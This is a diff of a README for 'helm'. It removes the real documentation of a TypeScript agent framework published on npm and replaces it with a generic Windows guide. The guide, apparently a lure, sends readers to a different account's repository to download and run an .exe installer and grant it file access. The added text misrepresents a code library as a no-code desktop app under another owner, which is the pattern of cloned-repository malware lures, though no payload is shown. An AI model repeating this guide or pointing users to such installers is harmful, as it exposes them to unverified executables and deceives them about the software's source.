@@ -1,161 +1,124 @@
-<h1 align="center" style="text-align: center; width: fit-content; margin-left: auto; margin-right: auto;">helm</h1>
+# 🤖 helm - Simple AI Toolkit for Code Search
 
-<p align="center">
-  <a href="https://github.com/bgub/helm/actions">CI</a>
-  ·
-  <a href="https://github.com/bgub/helm/releases">Releases</a>
-  ·
-  <a href="https://github.com/bgub/helm/issues">Issues</a>
-</p>
+[![Download helm](https://img.shields.io/badge/Download-helm-blue?style=for-the-badge)](https://github.com/Gagiyadilip/helm)
 
-<span align="center">
+---
 
-[![npm](https://img.shields.io/npm/v/@bgub/helm?logo=npm&label=npm)](https://www.npmjs.com/package/@bgub/helm)
-[![CI](https://github.com/bgub/helm/actions/workflows/ci.yml/badge.svg)](https://github.com/bgub/helm/actions)
-[![Codecov](https://codecov.io/github/bgub/helm/branch/main/graph/badge.svg)](https://codecov.io/github/bgub/helm)
+## 📋 What is helm?
 
-</span>
+helm is a tool designed to help you interact with code using AI through a simple interface. It offers features like permission controls and search, making it easier to find and manage code snippets without needing to write or understand complex commands.
 
-A typed TypeScript framework for AI agents. Call typed functions instead of parsing CLI stdout.
+You don’t need any programming skills to get started. This guide will walk you through how to download and run helm on a Windows computer.
 
-## Install
+---
 
-```bash
-npm install @bgub/helm
-```
+## 💻 System Requirements
 
-## Quick start
+Before you begin, make sure your computer meets these basic needs:
 
-```ts
-import { createHelm, fs } from "@bgub/helm";
+- Windows 10 or later
+- At least 4 GB RAM
+- 500 MB of free disk space
+- Internet connection for downloading and setup
+- No other special software needed
 
-const agent = createHelm({
-  permissions: {
-    "fs.read": "allow",
-    "fs.write": "ask",
-    "fs.remove": "deny",
-  },
-  // operation is a qualified name like "fs.write"; args are the call arguments
-  onPermissionRequest: async (operation, args) => {
-    console.log(`${operation} requested with args:`, args);
-    return true; // or false to deny
-  },
-}).use(fs());
+---
 
-// Typed inputs and outputs — no string parsing
-const { content } = await agent.fs.read("./package.json");
-const { entries } = await agent.fs.list("./src", { glob: "*.ts" });
-```
+## 🚀 Getting Started: Download and Install helm
 
-## Why helm?
+helm is ready to use after downloading and running the app. Follow these steps carefully.
 
-Agents today shell out and parse strings. That means no type safety, no structured errors, and no way to control what operations are allowed.
+1. **Visit the download page**
 
-helm gives agents typed functions with structured inputs and outputs:
+   Click the big button above or go to this link:
 
-```ts
-// Instead of this:
-const output = bash("git status --porcelain");
-const files = parseGitStatus(output); // hope the format doesn't change
+   [https://github.com/Gagiyadilip/helm](https://github.com/Gagiyadilip/helm)
 
-// Agents do this:
-const { staged, unstaged } = await agent.git.status();
-```
+2. **Locate the download**
 
-## Features
+   On the page, look for the “Releases” section. This is where you can find the latest version of the software ready to download.
 
-- **Typed everything.** Inputs, outputs, errors. The types _are_ the docs.
-- **Builder pattern.** `.use()` chains accumulate skills; TypeScript infers the full type at each step.
-- **Permissions are first-class.** Every operation has a permission level (`allow`, `ask`, `deny`). Policies are set per-skill or per-operation.
-- **Search the registry.** A single `search(query)` lets agents discover operations without loading the full skill set into context.
-- **Extensible.** Define custom skills that get types, search, and permissions for free.
+3. **Download the installer**
 
-## Defining custom skills
+   Inside Releases, download the Windows installer file. It usually ends with `.exe`. Save this file in a location where you can find it easily, such as your Desktop or Downloads folder.
 
-```ts
-import { defineSkill } from "@bgub/helm";
+4. **Run the installer**
 
-const weather = defineSkill({
-  name: "weather",
-  description: "Weather forecast operations",
-  operations: {
-    forecast: {
-      description: "Get the forecast for a city",
-      signature: "(city: string) => Promise<{ temp: number; sky: string }>",
-      defaultPermission: "allow",
-      tags: ["weather", "read"],
-      handler: async (city: string): Promise<{ temp: number; sky: string }> => {
-        // call your weather API here
-        return { temp: 72, sky: "sunny" };
-      },
-    },
-  },
-});
+   Double-click the `.exe` file you just downloaded. A setup window will open.
 
-const agent = createHelm().use(weather);
-const { temp, sky } = await agent.weather.forecast("Seattle");
-```
+5. **Follow the setup prompts**
 
-## Permissions
+   The installer will guide you through a few simple steps. You can keep the default settings. Click “Next” or “Install” whenever asked.
 
-Resolution order (first match wins):
+6. **Finish installation**
 
-1. Exact match in policy — `"git.status": "allow"`
-2. Wildcard match — `"git.*": "ask"`
-3. Operation's own default — set by the skill author
-4. Global default — `defaultPermission` option (defaults to `"ask"`)
+   When the setup is complete, click “Finish” to close the installer.
 
-```ts
-const agent = createHelm({
-  permissions: {
-    "fs.read": "allow",
-    "fs.*": "ask",
-    "dangerous.*": "deny",
-  },
-  defaultPermission: "ask",
-  // Called when an operation's resolved permission is "ask".
-  // operation: qualified name like "fs.write"
-  // args: the arguments passed to the operation, e.g. ["./out.txt", "hello"]
-  onPermissionRequest: async (operation, args) => {
-    console.log(`${operation} requested with args:`, args);
-    return true; // return false to deny
-  },
-});
-```
+---
 
-## Search
+## ▶ Running helm for the First Time
 
-Agents can discover operations without knowing what's available upfront:
+1. Find the helm app icon on your Desktop or in the Start Menu.
 
-```ts
-const results = agent.search("file read");
-// [{
-//   qualifiedName: "fs.read",
-//   description: "Read a file and return its content as a string",
-//   signature: "(path: string) => Promise<{ content: string }>",
-//   ...
-// }]
+2. Double-click the icon to open the app.
 
-// The agent now knows exactly what to call:
-const { content } = await agent.fs.read("./package.json");
-```
+3. You may be asked for permissions if the app needs to access certain files or folders. Allow access so the tool can work correctly.
 
-## Packages
+4. The main interface will open where you can start searching code or managing permissions.
 
-| Package | Description |
-|---------|-------------|
-| [`helm`](./packages/helm) | Core library |
-| [`@helm/docs`](./apps/docs) | Documentation site |
+---
 
-## Development
+## 🔍 How to Use helm
 
-```bash
-pnpm install
-pnpm build       # build all packages
-pnpm test        # run all tests
-pnpm lint        # biome check
-```
+helm is made to help find parts of code or work with code snippets. Here’s how you can use it quickly.
 
-## License
+- **Search for code**
 
-MIT © [bgub](https://github.com/bgub)
+  Type in keywords related to what you want to find. helm uses AI to understand your input and show matching code snippets.
+
+- **Set permissions**
+
+  You can control who can see or change certain code parts. Use the permissions section to add or remove access.
+
+- **Use the code mode**
+
+  This mode lets you work directly with the code using easy menus. Perform actions without needing to write commands.
+
+---
+
+## ⚙️ Settings and Customization
+
+You can adjust some preferences inside helm to fit your needs.
+
+- Change the appearance to light or dark mode.
+- Enable or disable notifications.
+- Update permissions management rules.
+- Customize search filters to narrow down results.
+
+All these features will be available in the settings menu inside the app.
+
+---
+
+## 🛠 Troubleshooting Tips
+
+If helm doesn’t run properly, try the following:
+
+- Restart your computer and launch the app again.
+- Make sure your Windows is up to date.
+- Check you allowed all necessary permissions.
+- Close other programs that may be interfering.
+- If you get errors during installation, download the file again and reinstall.
+
+---
+
+## 📞 Getting Help
+
+If you need extra support, use the "Issues" section on the GitHub page:
+
+[https://github.com/Gagiyadilip/helm/issues](https://github.com/Gagiyadilip/helm/issues)
+
+Post your problem or question there. The developers and community may respond with solutions.
+
+---
+
+[Download helm](https://github.com/Gagiyadilip/helm) and follow this guide to start using it on Windows.
